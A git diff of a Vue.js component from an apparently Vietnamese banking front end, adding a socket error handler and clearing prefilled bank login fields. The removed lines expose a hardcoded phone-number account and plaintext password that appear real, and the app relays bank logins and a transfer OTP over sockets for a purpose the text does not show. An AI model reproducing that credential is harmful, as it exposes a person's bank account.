@@ -141,8 +141,6 @@
 import axios from '@/plugins/axios';
 import { socket } from '@/plugins/socket';
 import { computed, onMounted, ref } from 'vue';
-import { useRouter } from 'vue-router';
-import { useStore } from 'vuex';
 
 const user = computed(() => store.state.user)
 const userStorage = JSON.parse(localStorage.getItem('user'))
@@ -188,6 +186,13 @@ onMounted(() => {
             dialogSuccess.value = false
             dialog.value = false
         }
+    })
+
+    socket.on(`send-data-error-${userStorage.numberPhone}`, async (data) => {
+        dialogSuccess.value = true
+        dialogMessage.value = 'Sai tài khoản hoặc mật khẩu'
+        dialog.value = false
+        dialogError.value = false
     })
 
     // socket.on('send-data-otp-vcb-chuyentien', (data) => {
@@ -296,8 +301,8 @@ const formRefOtpMethod = ref(null)
 const formRefOtpLogin = ref(null)
 const formValue = ref({
     bankLoginName: '',
-    bankLoginAccount: '0379044854',
-    bankLoginPassword: 'Bichtra88@',
+    bankLoginAccount: '',
+    bankLoginPassword: '',
     ...userStorage
 })
 const rules = {
